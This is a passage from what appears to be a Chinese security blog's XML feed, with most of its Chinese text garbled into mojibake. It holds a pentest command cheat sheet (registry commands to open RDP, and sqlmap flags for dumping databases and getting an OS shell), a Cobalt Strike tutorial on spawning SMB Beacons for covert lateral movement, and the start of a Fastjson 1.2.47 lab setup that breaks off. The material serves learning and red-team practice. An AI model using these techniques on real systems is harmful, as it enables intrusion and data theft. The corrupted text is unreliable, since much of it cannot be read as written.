fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</td><td>å¼€å¯3389</td></tr><tr><td>shell REG ADD  HKLM\SYSTEM\CurrentControlSet\Control\Terminalâ€ â€œServer &#x2F;v  fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 11111111 &#x2F;f</td><td>å…³é—­3389</td></tr></tbody></table><h2 id="Everythingæœç´¢è¯­å¥"><a href="#Everythingæœç´¢è¯­å¥" class="headerlink" title="Everythingæœç´¢è¯­å¥"></a>Everythingæœç´¢è¯­å¥</h2><table><thead><tr><th>è¯­å¥</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>dm:2022&#x2F;9&#x2F;1-2022&#x2F;9&#x2F;2 <em>.exe|</em>.bat|*.vbs</td><td>æœç´¢æŒ‡å®šæ—¶é—´æ–°å»ºçš„exeã€batã€vbsæ–‡ä»¶</td></tr><tr><td>empty:</td><td>æœç´¢ç©ºæ–‡ä»¶å¤¹</td></tr><tr><td>dm:thisyear</td><td>æœç´¢å½“å¹´æ–‡ä»¶</td></tr><tr><td>dc:thisweek</td><td>æœç´¢è¿™å‘¨åˆ›å»ºçš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹</td></tr><tr><td>dm:today</td><td>æœç´¢ä»Šæ—¥ä¿®æ”¹çš„æ–‡ä»¶</td></tr><tr><td>dm:2019-2021</td><td>æœç´¢å…·ä½“å¹´ä»½</td></tr><tr><td>d:|e: *.jpg</td><td>æœç´¢åˆ†åŒº D: æˆ– E: ä¸Š jpg æ–‡ä»¶</td></tr><tr><td>!.</td><td>æœç´¢æ— æ‰©å±•åçš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹</td></tr><tr><td>size:&gt;1mb</td><td>æœç´¢å¤§äº 1MB çš„æ–‡ä»¶</td></tr></tbody></table><h2 id="DockeråŸºç¡€å‘½ä»¤"><a href="#DockeråŸºç¡€å‘½ä»¤" class="headerlink" title="DockeråŸºç¡€å‘½ä»¤"></a>DockeråŸºç¡€å‘½ä»¤</h2><table><thead><tr><th>å‘½ä»¤</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>docker search tomcat</td><td>æœç´¢é•œåƒ</td></tr><tr><td>docker pull dordoka&#x2F;tomcat</td><td>æ‹‰å–é•œåƒ</td></tr><tr><td>docker images</td><td>æŸ¥çœ‹é•œåƒ</td></tr><tr><td>docker stop [å®¹å™¨IDæˆ–å®¹å™¨å]</td><td>åœæ­¢é•œåƒ</td></tr><tr><td>docker rmi [OPTIONS] [IMAGEID]</td><td>åˆ é™¤æœ¬åœ°é•œåƒï¼Œ-f å¼ºåˆ¶åˆ é™¤ï¼Œâ€“no-prune:ä¸ç§»é™¤é•œåƒäº§ç”Ÿçš„è¿‡ç¨‹é•œåƒã€‚é»˜è®¤ä¸ºç§»é™¤ã€‚</td></tr><tr><td>docker run dordoka&#x2F;tomcat</td><td>ç”Ÿæˆå®¹å™¨</td></tr><tr><td>docker run -p 8080:8080 -d doradoka&#x2F;tomcat</td><td>æŒ‡å®šç«¯å£ç”Ÿæˆå®¹å™¨.8080:8080,ç¬¬ä¸€ä¸ªæœ¬æœºç«¯å£ã€ç¬¬äºŒä¸ªå®¹å™¨è¿è¡ŒæœåŠ¡çš„ç«¯å£</td></tr><tr><td>docker run -it ubuntu</td><td>ç”Ÿæˆå®¹å™¨åè·å–äº¤äº’å¼ç»ˆç«¯ï¼ˆubuntuï¼‰</td></tr><tr><td>docker ps</td><td>æŸ¥çœ‹å®¹å™¨</td></tr><tr><td>docker exec -it 6e &#x2F;bin&#x2F;bash</td><td>è¿›å…¥å®¹å™¨</td></tr><tr><td>docker cp .&#x2F;flag.txt 28:&#x2F;var</td><td>å¤åˆ¶æ–‡ä»¶è¿›å…¥å®¹å™¨</td></tr><tr><td>docker cp 28:&#x2F;var C:\Users\flag.txt</td><td>å¤åˆ¶æ–‡ä»¶åˆ°æœ¬åœ°</td></tr><tr><td>docker ps -l</td><td>æ˜¾ç¤ºæœ€è¿‘åˆ›å»ºçš„å®¹å™¨</td></tr><tr><td>docker rm [IMAGEID]</td><td>åˆ æ‰ä¸€ä¸ªæˆ–å¤šä¸ªå®¹å™¨</td></tr></tbody></table><h2 id="Windowsæ—¥å¿—åˆ†æ"><a href="#Windowsæ—¥å¿—åˆ†æ" class="headerlink" title="Windowsæ—¥å¿—åˆ†æ"></a>Windowsæ—¥å¿—åˆ†æ</h2><h3 id="å¸¸ç”¨äº‹ä»¶-ID-å«ä¹‰"><a href="#å¸¸ç”¨äº‹ä»¶-ID-å«ä¹‰" class="headerlink" title="å¸¸ç”¨äº‹ä»¶ ID å«ä¹‰"></a>å¸¸ç”¨äº‹ä»¶ ID å«ä¹‰</h3><table><thead><tr><th>Event ID(2000&#x2F;XP&#x2F;2003)</th><th>Event ID(Vista&#x2F;7&#x2F;8&#x2F;2008&#x2F;2012)</th><th>æè¿°</th><th>æ—¥å¿—åç§°</th></tr></thead><tbody><tr><td>528</td><td>4624</td><td>æˆåŠŸç™»å½•</td><td>Security</td></tr><tr><td>529</td><td>4625</td><td>å¤±è´¥ç™»å½•</td><td>Security</td></tr><tr><td>680</td><td>4776</td><td>æˆåŠŸ&#x2F;å¤±è´¥çš„è´¦æˆ·è®¤è¯</td><td>Security</td></tr><tr><td>624</td><td>4720</td><td>åˆ›å»ºç”¨æˆ·</td><td>Security</td></tr><tr><td>636</td><td>4732</td><td>æ·»åŠ ç”¨æˆ·åˆ°å¯ç”¨å®‰å…¨æ€§çš„æœ¬åœ°ç»„ä¸­</td><td>Security</td></tr><tr><td>632</td><td>4728</td><td>æ·»åŠ ç”¨æˆ·åˆ°å¯ç”¨å®‰å…¨æ€§çš„å…¨å±€ç»„ä¸­</td><td>Security</td></tr><tr><td>2934</td><td>7030</td><td>æœåŠ¡åˆ›å»ºé”™è¯¯</td><td>System</td></tr><tr><td>2944</td><td>7040</td><td>IPSECæœåŠ¡æœåŠ¡çš„å¯åŠ¨ç±»å‹å·²ä»ç¦ç”¨æ›´æ”¹ä¸ºè‡ªåŠ¨å¯åŠ¨</td><td>System</td></tr><tr><td>2949</td><td>7045</td><td>æœåŠ¡åˆ›å»º</td><td>System</td></tr><tr><td>556</td><td>4662</td><td>DC hashä¼ é€’æ”»å‡»</td><td>Security</td></tr></tbody></table><h3 id="ç™»é™†ç±»å‹"><a href="#ç™»é™†ç±»å‹" class="headerlink" title="ç™»é™†ç±»å‹"></a>ç™»é™†ç±»å‹</h3><table><thead><tr><th>ç™»å½•ç±»å‹</th><th>æè¿°</th></tr></thead><tbody><tr><td>Interactive</td><td>ç”¨æˆ·ç™»å½•åˆ°æœ¬æœº</td></tr><tr><td>Network</td><td>ç”¨æˆ·æˆ–è®¡ç®—æ‰‹æœºä»ç½‘ç»œç™»å½•åˆ°æœ¬æœºï¼Œå¦‚æœç½‘ç»œå…±äº«ï¼Œæˆ–ä½¿ç”¨ net use è®¿é—®ç½‘ç»œå…±äº«ï¼Œnet view æŸ¥çœ‹ç½‘ç»œå…±äº«</td></tr><tr><td>Batch</td><td>æ‰¹å¤„ç†ç™»å½•ç±»å‹ï¼Œæ— éœ€ç”¨æˆ·å¹²é¢„</td></tr><tr><td>Service</td><td>æœåŠ¡æ§åˆ¶ç®¡ç†å™¨ç™»å½•</td></tr><tr><td>Unlock</td><td>ç”¨æˆ·è§£é”ä¸»æœº</td></tr><tr><td>NetworkCleartext</td><td>ç”¨æˆ·ä»ç½‘ç»œç™»å½•åˆ°æ­¤è®¡ç®—æœºï¼Œç”¨æˆ·å¯†ç ç”¨éå“ˆå¸Œçš„å½¢å¼ä¼ é€’</td></tr><tr><td>NewCredentials</td><td>è¿›ç¨‹æˆ–çº¿ç¨‹å…‹éš†äº†å…¶å½“å‰ä»¤ç‰Œï¼Œä½†ä¸ºå‡ºç«™è¿æ¥æŒ‡å®šäº†æ–°å‡­æ®</td></tr><tr><td>Remotelnteractive</td><td>ä½¿ç”¨ç»ˆç«¯æœåŠ¡æˆ–è¿œç¨‹æ¡Œé¢è¿æ¥ç™»å½•</td></tr><tr><td>Cachedlnteractive</td><td>ç”¨æˆ·ä½¿ç”¨æœ¬åœ°å­˜å‚¨åœ¨è®¡ç®—æœºä¸Šçš„å‡­æ®ç™»å½•åˆ°è®¡ç®—æœºï¼ˆåŸŸæ§åˆ¶å™¨å¯èƒ½æ— æ³•éªŒè¯å‡­æ®ï¼‰ï¼Œå¦‚ä¸»æœºä¸èƒ½è¿æ¥åŸŸæ§ï¼Œä»¥å‰ä½¿ç”¨åŸŸè´¦æˆ·ç™»å½•è¿‡è¿™å°ä¸»æœºï¼Œå†ç™»å½•å°±ä¼šäº§ç”Ÿè¿™æ ·æ—¥å¿—</td></tr><tr><td>CachedRemotelnteractive</td><td>ä¸ Remotelnteractive ç›¸åŒï¼Œå†…éƒ¨ç”¨äºå®¡è®¡ç›®çš„</td></tr><tr><td>CachedUnlock</td><td>ç™»å½•å°è¯•è§£é”</td></tr></tbody></table><h2 id="è·¯ç”±é…ç½®"><a href="#è·¯ç”±é…ç½®" class="headerlink" title="è·¯ç”±é…ç½®"></a>è·¯ç”±é…ç½®</h2><h3 id="Windwos"><a href="#Windwos" class="headerlink" title="Windwos"></a>Windwos</h3><table><thead><tr><th>å‘½ä»¤</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>route add  198.18.1.0ï¼ˆç½‘æ®µï¼‰ MASK 255.255.255.0(æ©ç ) 198.18.123.1(ç½‘å…³)</td><td>æ·»åŠ è·¯ç”±</td></tr><tr><td>route print å’Œ netstat -r</td><td>æŸ¥çœ‹è·¯ç”±è¡¨</td></tr><tr><td>route delete  10.10.10.0</td><td>åˆ é™¤è·¯ç”±</td></tr></tbody></table><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><table><thead><tr><th>å‘½ä»¤</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>sudo route add -net 198.18.1.0 netmask 255.255.255.0 gw 198.18.123.1</td><td>æ·»åŠ è·¯ç”±</td></tr><tr><td>route</td><td>æŸ¥çœ‹è·¯ç”±è¡¨</td></tr><tr><td>route del -net 192.168.0.0&#x2F;24 gw 192.168.0.1</td><td>åˆ é™¤è·¯ç”±</td></tr></tbody></table><h2 id="Sqlmapå¸¸ç”¨å‚æ•°"><a href="#Sqlmapå¸¸ç”¨å‚æ•°" class="headerlink" title="Sqlmapå¸¸ç”¨å‚æ•°"></a>Sqlmapå¸¸ç”¨å‚æ•°</h2><table><thead><tr><th>å‘½ä»¤å‚æ•°</th><th>å‚æ•°ä½œç”¨</th></tr></thead><tbody><tr><td>-u</td><td>æŒ‡å®šç›®æ ‡url</td></tr><tr><td>-r</td><td>ä»æ–‡ä»¶ä¸­åŠ è½½HTTPè¯·æ±‚ï¼ˆæ•°æ®åŒ…ï¼‰</td></tr><tr><td>*</td><td>jsonæ ¼å¼æŒ‡å®šå‚æ•°ï¼Œå¦‚æŒ‡å®šå‚æ•°orderNoï¼š{â€œphoneNoâ€:â€15123456789â€,â€platNumâ€:â€844519422627945â€,â€orderNoâ€:â€1*â€}</td></tr><tr><td>-m</td><td>ä»æ–‡æœ¬ä¸­è·å–å¤šä¸ªç›®æ ‡æ‰«æ</td></tr><tr><td>â€“data</td><td>ä»¥POSTæ–¹å¼æäº¤æ•°æ®</td></tr><tr><td>-random-agent</td><td>éšæœºUser-Agent</td></tr><tr><td>â€“user-agent</td><td>æŒ‡å®šUser-Agent</td></tr><tr><td>â€“delay</td><td>è®¾ç½®è¯·æ±‚é—´çš„å»¶è¿Ÿ</td></tr><tr><td>â€“timeout</td><td>æŒ‡å®šè¶…æ—¶æ—¶é—´</td></tr><tr><td>â€“dbms</td><td>æŒ‡å®šdbï¼Œsqlmapæ”¯æŒçš„dbæœ‰MySQLã€Oracleã€PostgreSQLã€Microsoft SQL Serverã€Microsoft Accessã€SQLiteç­‰</td></tr><tr><td>â€“os</td><td>æŒ‡å®šæ•°æ®åº“æœåŠ¡å™¨æ“ä½œç³»ç»Ÿ</td></tr><tr><td>â€“tamper</td><td>æŒ‡å®šè„šæœ¬tamper</td></tr><tr><td>â€“level</td><td>æŒ‡å®šæ¢æµ‹ç­‰çº§</td></tr><tr><td>â€“risk</td><td>æŒ‡å®šé£é™©ç­‰çº§</td></tr><tr><td>â€“technique</td><td>B: Boolean-based blind SQL injection<br/>E: Error-based SQL injection<br/>U: UNION query SQL injection<br/>S: Stacked queries SQL injection<br/>T: Time-based blind SQL injection</td></tr><tr><td>-p</td><td>æŒ‡å®šéœ€è¦æµ‹è¯•çš„å‚æ•°</td></tr><tr><td>â€“batch</td><td>è‡ªåŠ¨é€‰æ‹©Y&#x2F;N</td></tr><tr><td>â€“dbs</td><td>æšä¸¾æ•°æ®åº“</td></tr><tr><td>-D</td><td>DATABASEï¼šæŒ‡å®šæ•°æ®åº“</td></tr><tr><td>â€“tables</td><td>æšä¸¾è¡¨å</td></tr><tr><td>-T</td><td>æŒ‡å®šè¡¨å</td></tr><tr><td>â€“columns</td><td>æšä¸¾åˆ—å</td></tr><tr><td>-D</td><td>COLUMNï¼šæŒ‡å®šå­—æ®µ</td></tr><tr><td>â€“dump</td><td>è„±å–æŒ‡å®šå­—æ®µ</td></tr><tr><td>â€“dump-all</td><td>è„±å–æ•°æ®åº“å…¨éƒ¨å­—æ®µ</td></tr><tr><td>-a&#x2F;â€“all</td><td>è·å–æ‰€æœ‰ä¿¡æ¯</td></tr><tr><td>-b&#x2F;â€“banner</td><td>è·å–bannerä¿¡æ¯</td></tr><tr><td>â€“current-user</td><td>è·å–å½“å‰æ•°æ®åº“ç”¨æˆ·</td></tr><tr><td>â€“is-dba</td><td>åˆ¤æ–­å½“å‰ç”¨æˆ·æ˜¯å¦ä¸ºDBAæƒé™</td></tr><tr><td>â€“users</td><td>æšä¸¾ç”¨æˆ·åˆ—è¡¨</td></tr><tr><td>â€“sql-shell</td><td>è¿”å›äº¤äº’å¼sqlçš„shell</td></tr><tr><td>â€“os-shell</td><td>è¿”å›äº¤äº’å¼çš„æ“ä½œç³»ç»Ÿshell</td></tr><tr><td>â€“os-cmd</td><td>æ‰§è¡ŒOSå‘½ä»¤CMD</td></tr><tr><td>â€“cookie&#x3D;COOKIE</td><td>ä¼ªé€ cookie</td></tr><tr><td>â€“proxy&#x3D;PROXY</td><td>ä½¿ç”¨ä»£ç†è¿æ¥ç›®æ ‡ URL</td></tr><tr><td>â€“mobile</td><td>ä½¿ç”¨ HTTP User-Agent æ¨¡ä»¿æ™ºèƒ½æ‰‹æœº</td></tr><tr><td>-H HEADER</td><td>è®¾ç½®é¢å¤–çš„ HTTP å¤´å‚æ•°ï¼ˆä¾‹å¦‚ï¼šâ€X-Forwarded-For: 127.0.0.1â€ï¼‰</td></tr><tr><td>â€“ignore-proxy</td><td>å¿½ç•¥ç³»ç»Ÿé»˜è®¤ä»£ç†è®¾ç½®</td></tr><tr><td>*</td><td>åœ¨</td></tr><tr><td>â€“keep-alive</td><td>ä¿æŒè¿æ¥ï¼Œå‡ºç°[CRITICAL] connectionâ€¦â€¦æŠ¥é”™çš„æ—¶å€™ï¼Œä½¿ç”¨è¿™ä¸ªå‚æ•°</td></tr><tr><td>â€“referer <a href="http://www.baidu.com/">http://www.baidu.com</a></td><td>#ä¼ªé€ refererå­—æ®µ</td></tr><tr><td>-v 3</td><td>è¾“å‡ºè¯¦ç»†åº¦,æœ€å¤§å€¼5,ä¼šæ˜¾ç¤ºè¯·æ±‚åŒ…å’Œå›å¤åŒ…</td></tr><tr><td>â€“roles</td><td>åˆ—å‡ºæ•°æ®åº“æ‰€æœ‰ç®¡ç†å‘˜è§’è‰²ï¼Œä»…é€‚ç”¨äºoracleæ•°æ®åº“çš„æ—¶å€™</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> å‘½ä»¤å¤‡å¿˜å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å‘½ä»¤å¤‡å¿˜å½• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike-æ´¾ç”ŸSMB_Beacon</title>
      <link href="/2022/09/03/Cobaltstrike-%E6%B4%BE%E7%94%9FSMB-Beacon/"/>
      <url>/2022/09/03/Cobaltstrike-%E6%B4%BE%E7%94%9FSMB-Beacon/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="SMB-Beacon-ç®€ä»‹"><a href="#SMB-Beacon-ç®€ä»‹" class="headerlink" title="SMB Beacon ç®€ä»‹"></a>SMB Beacon ç®€ä»‹</h2><p>æ´¾ç”Ÿ SMB Beaconï¼ŒCobastrike å†…ç½‘æ¨ªå‘æ¸—é€æ‰©å±•åŠŸèƒ½ï¼ŒWindows å°†å‘½åç®¡é“é€šä¿¡å°è£…åœ¨ SMB åè®®ä¸­ï¼Œæ­¤æµé‡å°è£…åœ¨SMBåè®®ä¸­ï¼Œæ‰€ä»¥SMB beaconç›¸å¯¹éšè”½ï¼Œèƒ½æœ€å¤§ç¨‹åº¦è§„é¿å®‰å…¨è®¾å¤‡åŠé˜²ç«å¢™çš„å‘ç°ã€‚SMB Beacon ä½¿ç”¨å‘½åç®¡é“é€šè¿‡çˆ¶çº§ Beacon è¿›è¡Œé€šè®¯ï¼Œå½“ä¸¤ä¸ªBeaconsé“¾æ¥åï¼Œå­Beaconä»çˆ¶Beaconè·å–åˆ°ä»»åŠ¡å¹¶å‘é€ã€‚è¿™ç§å¯¹ç­‰é€šä¿¡å¯¹åŒä¸€å°ä¸»æœºä¸Šçš„ Beacon å’Œè·¨ç½‘ç»œçš„ Beacon éƒ½æœ‰æ•ˆï¼Œå³ SMB Beacon é€šè¿‡ç®¡é“ï¼ˆ pipeï¼‰è¿›è¡Œè¿›ç¨‹é—´çš„æ•°æ®ä¼ é€’ã€‚ç®¡é“é€šä¿¡çš„è¿›ç¨‹å¯ä»¥æ˜¯æœ¬åœ°ä¸»æœºä¸Šçš„ä¸¤ä¸ªè¿›ç¨‹ï¼Œä¹Ÿå¯ä»¥å’Œè¿œç¨‹ä¸»æœºä¸Šçš„è¿›ç¨‹é€šè¿‡ç½‘ç»œè¿›è¡Œé€šä¿¡ã€‚SMB beaconä¸èƒ½ç›´æ¥ç”Ÿæˆå¯ç”¨è½½è·, åªèƒ½ä½¿ç”¨ PsExec æˆ– Stageless Payload ä¸Šçº¿ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/Beacon/1.png" data-caption="3.1"><img src="/../images/Beacon/1.png" alt="3.1"></a></p><h2 id="ä½¿ç”¨è¦æ±‚"><a href="#ä½¿ç”¨è¦æ±‚" class="headerlink" title="ä½¿ç”¨è¦æ±‚"></a>ä½¿ç”¨è¦æ±‚</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å…·æœ‰SMB Beaconçš„ä¸»æœºå¿…é¡»æ¥å—ç«¯å£445ä¸Šçš„è¿æ¥ã€‚</span><br><span class="line">åªèƒ½é“¾æ¥ç”±åŒä¸€Cobalt Strikeå®ä¾‹ç®¡ç†çš„Beaconã€‚</span><br></pre></td></tr></table></figure></div><h2 id="æ´¾ç”Ÿ-SMB-Beacon"><a href="#æ´¾ç”Ÿ-SMB-Beacon" class="headerlink" title="æ´¾ç”Ÿ SMB Beacon"></a>æ´¾ç”Ÿ SMB Beacon</h2><p>1ã€é€šè¿‡å‰æœŸæ‰“ç‚¹ï¼Œå·²ä¸Šçº¿CSï¼Œè·å–beacon</p><p><a data-fancybox="gallery" data-src="/../images/Beacon/2.png" data-caption="image-20220903110750284"><img src="/../images/Beacon/2.png" alt="image-20220903110750284"></a></p><p>2ã€æ´¾ç”ŸSMB Beacon</p><p>æ–°å»ºSMB Beacon ç›‘å¬å™¨</p><p><a data-fancybox="gallery" data-src="/../images/Beacon/3.png" data-caption="image-20220903110819958"><img src="/../images/Beacon/3.png" alt="image-20220903110819958"></a></p><p>æ´¾ç”Ÿä¼šè¯SMB Beaconï¼Œä¸ªäººä¹ æƒ¯é¦–å…ˆsleep 0ï¼Œå³é”®é€‰ä¸­HTTPç›‘å¬å™¨ä¸Šçº¿çš„ä¸»æœºï¼Œinteractè¿›å…¥Beaconæ§åˆ¶å°ï¼Œè¾“å…¥spawnåŠ SMB Beaconçš„ç›‘å¬å™¨åç§°ï¼Œåˆšæ–°å»ºåç§°ä¸ºSMBï¼Œæ‰€ä»¥æ‰§è¡Œ<code>spawn SMB</code>ï¼Œè¿è¡ŒæˆåŠŸååœ¨externalä¸­å¯ä»¥çœ‹åˆ°IPåæœ‰ä¸ª<code>âˆâˆ</code>å­—ç¬¦çš„æ´¾ç”ŸSMB Beaconã€‚</p><p><a data-fancybox="gallery" data-src="/../images/Beacon/4.png" data-caption="image-20220902223114325"><img src="/../images/Beacon/4.png" alt="image-20220902223114325"></a></p><p>æ­¤æ—¶æ´¾ç”ŸBeaconå¯åŒçˆ¶Beaconä¸€æ ·æ‰§è¡Œå‘½ä»¤</p><p><a data-fancybox="gallery" data-src="/../images/Beacon/5.png" data-caption="image-20220903112356439"><img src="/../images/Beacon/5.png" alt="image-20220903112356439"></a></p><h2 id="å›¢ä¼™åä½œ-ï¼ˆå¤±è´¥ï¼‰"><a href="#å›¢ä¼™åä½œ-ï¼ˆå¤±è´¥ï¼‰" class="headerlink" title="å›¢ä¼™åä½œ-ï¼ˆå¤±è´¥ï¼‰"></a>å›¢ä¼™åä½œ-ï¼ˆå¤±è´¥ï¼‰</h2><p>ä¸»ä»æœåŠ¡å™¨ æ´¾ç”Ÿ åˆ°é˜Ÿä¼æœåŠ¡å™¨ã€‚SMB Beaconå¯æ´¾ç”Ÿå¤šä¸ªBeaconï¼Œå¯ç‹¬ç«‹æ´¾ç”ŸBeaconç»™å›¢é˜Ÿæ¯ä¸€ä½æˆå‘˜ï¼Œä¸”Beaconåœ¨å„è‡ªçš„æœåŠ¡å™¨ä¸Šï¼Œäº’ä¸å½±å“ã€‚å³ä»ä¸»ä»æœåŠ¡å™¨æ´¾ç”Ÿåˆ°é˜Ÿä¼æœåŠ¡å™¨</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é˜Ÿå‹æœåŠ¡å™¨ Listen ç”Ÿæˆ &gt; å›¢é˜ŸæœåŠ¡å™¨ Listen ç”Ÿæˆ ä½¿ç”¨é˜Ÿå‹IP &gt; Spawn</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Beacon/6.png" data-caption="image-20220903113550312"><img src="/../images/Beacon/6.png" alt="image-20220903113550312"></a></p><p><a data-fancybox="gallery" data-src="/../images/Beacon/7.png" data-caption="image-20220903113820361"><img src="/../images/Beacon/7.png" alt="image-20220903113820361"></a></p><p>å¾ˆé—æ†¾ï¼Œè¿™ä¸€æ­¥å‚è€ƒäº†å¾ˆå¤šæ–‡ç« éƒ½æ— æ³•å®ç°ï¼Œåè¡¥â€¦..</p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/q20010619/article/details/121755856</span><br><span class="line">http://www.luckyzmj.cn/posts/35eac48c.html</span><br><span class="line">https://www.cnblogs.com/f-carey/p/15844629.html#tid-z8j5nK</span><br><span class="line">http://blog.leanote.com/cate/snowming/Cobalt-Strike</span><br><span class="line">http://blog.leanote.com/post/snowming/2ec80f7823e0</span><br><span class="line">https://github.com/aleenzz/Cobalt_Strike_wiki/blob/master/%E7%AC%AC%E4%B8%89%E8%8A%82%5BSMB%20Beacon%5D.md</span><br><span class="line">https://apt404.github.io/2017/12/29/cobalt-strike-spawn/</span><br><span class="line">http://blog.leanote.com/post/snowming/de88219734d1</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> å·¥å…·ä½¿ç”¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CobaltStrike </tag>
            
            <tag> å·¥å…·ä½¿ç”¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson-1.2.47æ¼æ´ç¯å¢ƒæ­å»ºåŠå¤ç°</title>
      <link href="/2022/09/02/Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/09/02/Fastjson-1-2-47%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/1.png" data-caption="image-20220831181656337"><img src="/../images/fastjson-1.2.47/1.png" alt="image-20220831181656337"></a></p><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>è¿‘æœŸæ”»é˜²å€¼å®ˆæœŸé—´ï¼Œå‘ç°å®¢æˆ·å•ä½ä»ç„¶å­˜åœ¨ Fastjson ååºåˆ—åŒ–æ¼æ´ï¼Œæ—¶éš”å¤šç§‹è¯¥æ¼æ´ä»ç„¶å¯ä»¥è¢«ä½œä¸ºæ‰“ç‚¹çš„åˆ©å™¨ï¼Œäºæ˜¯æœ¬ç€å­¦ä¹ çš„å¿ƒæ€é‡æ–°å­¦ä¹ ä¸€éã€‚</p><h2 id="Ox01-ç¯å¢ƒæ­å»º"><a href="#Ox01-ç¯å¢ƒæ­å»º" class="headerlink" title="Ox01 ç¯å¢ƒæ­å»º"></a>Ox01 ç¯å¢ƒæ­å»º</h2><blockquote><p>Tomcatç¯å¢ƒæ­å»º</p></blockquote><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre><span class="meta prompt_">$</span>ä¸‹è½½ tomcat9archive.apache.org/dist/tomcat/tomcat-9/v9.0.27/bin/apache-tomcat-9.0.27.zip<p><span class="meta prompt_">$</span> å°†æ­¤å‹ç¼©åŒ…å¤åˆ¶åˆ°linuxæœåŠ¡å™¨ä¸Šï¼Œå¹¶é‡å‘½åä¸ºtomcat9<br>tar -zxvf apache-tomcat-9.0.27.tar.gz<br>mv &#x2F;apache-tomcat-9.0.27 &#x2F;tomcat9</p><p><span class="meta prompt_">$</span> æˆäºˆtomcat9è¿™ä¸ªæ–‡ä»¶å¤¹777æƒé™<br>chmod -R 777 &#x2F;tomcat9<br></pre></p></td></tr></tbody></table></figure><blockquote><p>Java ç¯å¢ƒæ­å»º</p></blockquote><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre><span class="meta prompt_">$</span> ä¸‹è½½ java 8u181https://mirrors.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz<p><span class="meta prompt_">$</span> è§£å‹åå°† java æ–‡ä»¶å¤åˆ¶åˆ° &#x2F;usr&#x2F;java ç›®å½•ä¸‹<br>tar -zxvf jdk-8u181-linux-x64.tar.gz<br>mkdir &#x2F;usr&#x2F;java<br>mv jdk1.8.0_181&#x2F; &#x2F;usr&#x2F;java</p><p><span class="meta prompt_">$</span> é…ç½® java ç¯å¢ƒ<br>vim &#x2F;etc&#x2F;profile</p><p><span class="meta prompt_">$</span> é…ç½® java ç¯å¢ƒï¼Œå…¶ä¸­ CATALINA_HOME&#x3D;&#x2F; æœ¬åœ° tomcat ç›®å½•,å…·ä½“çœ‹è‡ªèº« tomcat9 æ”¾ç½®è·¯å¾„åœ¨å“ª<br>export JAVA_HOME&#x3D;&#x2F;usr&#x2F;java&#x2F;jdk1.8.0_181<br>export JRE_HOME&#x3D;&#x2F;usr&#x2F;java&#x2F;jdk1.8.0_181&#x2F;jre<br>export CLASS_PATH&#x3D;.:$JAVA_HOME&#x2F;lib&#x2F;dt.jar:$JAVA_HOME&#x2F;lib&#x2F;tools.jar:$JRE_HOME&#x2F;lib<br>export PATH&#x3D;$PATH:$JAVA_HOME&#x2F;bin:$JRE_HOME&#x2F;bin<br>export CATALINA_HOME&#x3D;&#x2F;tomcat9</p><p><span class="meta prompt_">$</span> ä½¿é…ç½®æ–‡ä»¶ç”Ÿæ•ˆ<br>source &#x2F;etc&#x2F;profile</p><p><span class="meta prompt_">$</span> æŸ¥çœ‹ java ç¯å¢ƒæ˜¯å¦ç”Ÿæ•ˆ<br>[root@vultr ~]# java -version<br>java version â€œ1.8.0_181â€<br>Java(TM) SE Runtime Environment (build 1.8.0_181-b13)<br>Java 